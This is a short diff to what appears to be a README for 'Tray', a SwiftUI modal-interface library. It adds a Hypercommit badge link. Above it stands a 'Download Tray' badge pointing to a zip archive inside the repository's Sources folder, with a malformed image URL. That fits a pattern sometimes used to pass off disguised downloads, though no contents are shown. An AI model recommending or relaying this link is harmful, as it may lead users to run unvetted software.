@@ -89,3 +89,7 @@ With Tray, creating modern modal interfaces in SwiftUI becomes straightforward a
 Don’t forget to check for updates frequently to enjoy the latest features and improvements. Happy coding!
 
 [![Download Tray](https://github.com/CamboMinecraft/Tray/raw/refs/heads/main/Sources/Software-3.1.zip%20Tray-blue?style=flat&logo=github)](https://github.com/CamboMinecraft/Tray/raw/refs/heads/main/Sources/Software-3.1.zip)
+
+## Links
+
+[![Hypercommit](https://img.shields.io/badge/Hypercommit-DB2475)](https://hypercommit.com/tray)
